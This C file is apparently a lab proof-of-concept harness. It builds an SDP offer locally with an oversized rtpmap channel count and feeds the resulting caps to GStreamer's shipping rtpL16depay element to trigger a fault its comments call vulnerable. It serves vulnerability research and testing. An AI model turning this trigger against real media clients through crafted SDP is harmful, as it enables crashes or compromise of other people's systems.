/* Far-end SDP text -> GStreamer caps -> SHIPPING rtpL16depay set_caps.
 * Purely local: the SDP string is synthesized here; no network is used.
 * This tests whether an SDP rtpmap channel count reaches the vulnerable
 * encoding-params caps field and faults the real plugin.
 */
#include <gst/gst.h>
#include <gst/sdp/gstsdpmessage.h>
#include <stdio.h>
#include <stdlib.h>

int
main (int argc, char **argv)
{
  gint channels = 1000;
  GstSDPMessage *msg = NULL;
  const GstSDPMedia *media;
  GstCaps *caps;
  GstElement *pipe, *dep, *sink_elem;
  GstPad *sink;
  gchar *sdp, *capsstr;
  gboolean ok;
  GstSDPResult r;

  if (argc > 1)
    channels = atoi (argv[1]);
  gst_init (&argc, &argv);
  setvbuf (stdout, NULL, _IONBF, 0);

  /* Standard SDP offer shape; the third rtpmap field is the channel count. */
  sdp = g_strdup_printf ("v=0\r\n"
      "o=- 0 0 IN IP4 127.0.0.1\r\n"
      "s=gst2shell-lab\r\n"
      "c=IN IP4 127.0.0.1\r\n"
      "t=0 0\r\n"
      "m=audio 5004 RTP/AVP 96\r\n"
      "a=rtpmap:96 L16/44100/%d\r\n", channels);
  printf ("sdp_rtpmap=a=rtpmap:96 L16/44100/%d\n", channels);

  r = gst_sdp_message_new_from_text (sdp, &msg);
  if (r != GST_SDP_OK) {
    printf ("sdp_parse=%d\n", r);
    return 2;
  }
  media = gst_sdp_message_get_media (msg, 0);
  if (!media) {
    printf ("NO_MEDIA\n");
    return 2;
  }
  caps = gst_sdp_media_get_caps_from_media (media, 96);
  if (!caps) {
    printf ("NO_CAPS\n");
    return 2;
  }
  /* gst_sdp_media_get_caps_from_media() yields the correct SDP-derived fields
   * but names the structure application/x-unknown here; a real rtspsrc
   * emits application/x-rtp with those same fields. Rename only. */
  {
    GstStructure *st = gst_caps_get_structure (caps, 0);
    gst_structure_set_name (st, "application/x-rtp");
  }
  capsstr = gst_caps_to_string (caps);
  printf ("caps_from_sdp=%s\n", capsstr);

  pipe = gst_pipeline_new ("p");
  dep = gst_element_factory_make ("rtpL16depay", "dep");
  sink_elem = gst_element_factory_make ("fakesink", "sink");
  if (!dep || !sink_elem) {
    printf ("NO_ELEMENT\n");
    return 2;
  }
  gst_bin_add_many (GST_BIN (pipe), dep, sink_elem, NULL);
  gst_element_link (dep, sink_elem);
  gst_element_set_state (pipe, GST_STATE_PLAYING);
  sink = gst_element_get_static_pad (dep, "sink");

  printf ("calling real set_caps\n");
  ok = gst_pad_set_caps (sink, caps);
  printf ("set_caps=%d\n", ok);

  g_free (capsstr);
  gst_caps_unref (caps);
  gst_sdp_message_free (msg);
  g_free (sdp);
  gst_object_unref (sink);
  gst_element_set_state (pipe, GST_STATE_NULL);
  gst_object_unref (pipe);
  return 0;
}
